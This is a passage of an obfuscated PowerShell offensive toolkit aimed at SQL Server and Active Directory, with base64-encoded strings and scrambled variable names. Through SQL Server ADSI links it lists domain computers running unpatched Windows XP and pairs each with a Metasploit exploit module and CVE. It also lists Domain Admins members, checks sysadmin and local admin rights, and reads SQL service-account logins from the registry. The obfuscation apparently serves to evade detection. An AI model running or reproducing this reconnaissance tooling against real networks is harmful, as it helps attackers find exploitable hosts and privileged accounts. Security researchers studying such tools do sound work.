        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADYANgBfAG4AdwBhAHAAaQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA4ADgA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADcAMABfAHcAawBzAHMAdgBjAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA5ADEA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        ${_/\/\____/==\/===} = New-Object System.Data.DataTable 
        ${_/\/\____/==\/===}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))) | Out-Null
        ${_/\/\____/==\/===}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))) | Out-Null
        ${_/\/\____/==\/===}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))) | Out-Null
        ${_/\/\____/==\/===}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBvAG4A')))) | Out-Null
        ${_/\/\____/==\/===}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBzAGYATQBvAGQAdQBsAGUA')))) | Out-Null  
        ${_/\/\____/==\/===}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBWAEUA')))) | Out-Null
    }
    Process
    {
        if($UseAdHoc){
            ${_/\_/==\___/=\/\_} = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBDAG8AbQBwAHUAdABlAHIAKQA='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlACwAbwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0ALABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQB2AGUAcgBzAGkAbwBuACwAbwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AcwBlAHIAdgBpAGMAZQBwAGEAYwBrACwAdwBoAGUAbgBjAGgAYQBuAGcAZQBkACwAbABvAGcAbwBuAGMAbwB1AG4AdAA='))) -UseAdHoc            
        }else{
            ${_/\_/==\___/=\/\_} = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBDAG8AbQBwAHUAdABlAHIAKQA='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlACwAbwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0ALABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQB2AGUAcgBzAGkAbwBuACwAbwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AcwBlAHIAdgBpAGMAZQBwAGEAYwBrACwAdwBoAGUAbgBjAGgAYQBuAGcAZQBkACwAbABvAGcAbwBuAGMAbwB1AG4AdAA=')))            
        }
        ${/==\/============} | % {
            ${___/\____/\/\_/\_} = $_.OperatingSystem
            ${__/\__/==\_/\_/==} = $_.ServicePack
            ${/=\_/==\/\_/=\/=\} = $_.MsfModule
            ${_/\/==\__/\/=\/\_} = $_.CVE
            ${_/\_/==\___/=\/\_} | % {
                ${_/=\/==\_/\/\_/=\} = $_.DNSHostName
                ${__/==\/==\/===\__} = $_.OperatingSystem
                ${_/=====\/\_/=\/\_} = $_.OperatingSystemServicePack                                                      
                ${_/\_/\_/===\/===\} = $_.LastLogon
                if (${__/==\/==\/===\__} -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAC8AXABfAF8AXwBfAC8AXAAvAFwAXwAvAFwAXwB9ACoA'))) -and ${_/=====\/\_/=\/\_} -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAFwAXwBfAC8APQA9AFwAXwAvAFwAXwAvAD0APQB9AA=='))) ){                    
                    ${_/\/\____/==\/===}.Rows.Add(${_/=\/==\_/\/\_/=\},${__/==\/==\/===\__},${_/=====\/\_/=\/\_},[dateTime]::FromFileTime(${_/\_/\_/===\/===\}),${/=\_/==\/\_/=\/=\},${_/\/==\__/\/=\/\_}) | Out-Null 
                }
            }
        }
        ${_/\/\____/==\/===} | sort { $_.lastlogon -as [datetime]} -Descending  
    }
    End
    {               
    }
}
Function  Get-SQLDomainGroupMember
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain group to filter for.')]
        [string]$FilterGroup,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if((-not $FilterGroup)){
            $FilterGroup = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AIABBAGQAbQBpAG4AcwA=')))
        }
        ${_/\/==\_____/====} = New-Object System.Data.DataTable
        ${_/\/==\_____/====}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))) | Out-Null
        ${_/\/==\_____/====}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBBAE0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAA==')))) | Out-Null
        ${_/\/==\_____/====}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAcABsAGEAeQBOAGEAbQBlAA==')))) | Out-Null
    }
    Process
    {
        if($UseAdHoc){
            ${_/=\__/\/\_/=\/==} = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAKABzAGEAbQBhAGMAYwBvAHUAbgB0AG4AYQBtAGUAPQAkAEYAaQBsAHQAZQByAEcAcgBvAHUAcAApACkA'))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))) -UseAdHoc -SuppressVerbose
        }else{
            ${_/=\__/\/\_/=\/==} = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAKABzAGEAbQBhAGMAYwBvAHUAbgB0AG4AYQBtAGUAPQAkAEYAaQBsAHQAZQByAEcAcgBvAHUAcAApACkA'))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))) -SuppressVerbose       
        }
        ${___/\/\/\/=\_/==\} = ${_/=\__/\/\_/=\/==}.distinguishedname
        if($UseAdHoc){
            ${__/\/=\/=\/\/\_/\} = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AdQBzAGUAcgApACgAbQBlAG0AYgBlAHIATwBmAD0AJAB7AF8AXwBfAC8AXAAvAFwALwBcAC8APQBcAF8ALwA9AD0AXAB9ACkAKQA='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAcABsAGEAeQBuAGEAbQBlAA=='))) -UseAdHoc
        }else{
            ${__/\/=\/=\/\/\_/\} = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AdQBzAGUAcgApACgAbQBlAG0AYgBlAHIATwBmAD0AJAB7AF8AXwBfAC8AXAAvAFwALwBcAC8APQBcAF8ALwA9AD0AXAB9ACkAKQA='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAcABsAGEAeQBuAGEAbQBlAA==')))     
        }
        ${__/\/=\/=\/\/\_/\} | % {           
            ${_/\/==\_____/====}.Rows.Add($FilterGroup,$_.samaccountname,$_.displayname) | Out-Null 
        }
        ${_/\/==\_____/====}
    }
    End
    {               
    }
}
Function  Get-SQLSysadminCheck
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_/==\/\/\/===\__/} = New-Object -TypeName System.Data.DataTable
        if($CredentialName)
        {
            ${_/\_/\____/\/\/==} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABXAEgARQBSAEUAIABuAGEAbQBlACAAbABpAGsAZQAgACcAJABDAHIAZQBkAGUAbgB0AGkAYQBsAE4AYQBtAGUAJwA=')))
        }
        else
        {
            ${_/\_/\____/\/\/==} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIAAgACAAIAAnACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAJwAgAGEAcwAgAFsAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnACQASQBuAHMAdABhAG4AYwBlACcAIABhAHMAIABbAEkAbgBzAHQAYQBuAGMAZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEMAQQBTAEUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcASABFAE4AIABJAFMAXwBTAFIAVgBSAE8ATABFAE0ARQBNAEIARQBSACgAJwBzAHkAcwBhAGQAbQBpAG4AJwApACAAPQAgACAAMAAgAFQASABFAE4AIAAnAE4AbwAnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAEwAUwBFACAAJwBZAGUAcwAnAA0ACgAgACAAIAAgACAAIAAgACAARQBOAEQAIABhAHMAIABJAHMAUwB5AHMAYQBkAG0AaQBuAA==')))
        ${_____/===\/\____/} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${_/==\/\/\/===\__/} = ${_/==\/\/\/===\__/} + ${_____/===\/\____/}
    }
    End
    {
        ${_/==\/\/\/===\__/}
    }
}
Function  Get-SQLLocalAdminCheck
{
    Begin
    {
    }
    Process
    {
        ${_/==\_/=\___/==\/} = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        ${_____/======\____} = ${_/==\_/=\___/==\/}.name
        ${/=\_/\_/==\/\/\/\} = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList (${_/==\_/=\___/==\/})
        ${/====\__/\/\/====} = [System.Security.Principal.WindowsBuiltInRole]::Administrator        
        ${/=\_/\_/==\/\/\/\}.IsInRole(${/====\__/\/\/====})
    }
    End
    {
    }
}
Function  Get-SQLServiceAccount
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/===\/=\/\__/\___} = New-Object -TypeName System.Data.DataTable
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        ${__/\/==\____/\_/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
        if(${__/\/==\____/\_/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
        {
            ${___/==\_/\/=\/=\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABTAFEATAAgAFMAZQByAHYAZQByACAAQgByAG8AdwBzAGUAcgAgAC0AIABTAHQAYQB0AGkAYwAgAEwAbwBjAGEAdABpAG8AbgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAFgARQBDAFUAVABFACAAIAAgACAAIAAgACAAbQBhAHMAdABlAHIALgBkAGIAbwAuAHgAcABfAGkAbgBzAHQAYQBuAGMAZQBfAHIAZQBnAHIAZQBhAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAByAG8AbwB0AGsAZQB5ACAAIAAgACAAIAAgAD0AIABOACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAawBlAHkAIAAgACAAIAAgACAAIAAgACAAIAA9ACAATgAnAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAUwBlAHIAdgBpAGMAZQBzAFwAUwBRAEwAQgByAG8AdwBzAGUAcgAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUAXwBuAGEAbQBlACAAIAAgAD0AIABOACcATwBiAGoAZQBjAHQATgBhAG0AZQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUAIAAgACAAIAAgACAAIAAgAD0AIABAAEIAcgBvAHcAcwBlAHIATABvAGcAaQBuACAATwBVAFQAUABVAFQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABTAFEATAAgAFMAZQByAHYAZQByACAAVwByAGkAdABlAHIAIAAtACAAUwB0AGEAdABpAGMAIABMAG8AYwBhAHQAaQBvAG4ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBYAEUAQwBVAFQARQAgACAAIAAgACAAIAAgAG0AYQBzAHQAZQByAC4AZABiAG8ALgB4AHAAXwBpAG4AcwB0AGEAbgBjAGUAXwByAGUAZwByAGUAYQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAcgBvAG8AdABrAGUAeQAgACAAIAAgACAAIAA9ACAATgAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFACcALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAGsAZQB5ACAAIAAgACAAIAAgACAAIAAgACAAPQAgAE4AJwBTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAFMAZQByAHYAaQBjAGUAcwBcAFMAUQBMAFcAcgBpAHQAZQByACcALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQBfAG4AYQBtAGUAIAAgACAAPQAgAE4AJwBPAGIAagBlAGMAdABOAGEAbQBlACcALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQAgACAAIAAgACAAIAAgACAAPQAgAEAAVwByAGkAdABlAHIATABvAGcAaQBuACAATwBVAFQAUABVAFQADQAKAC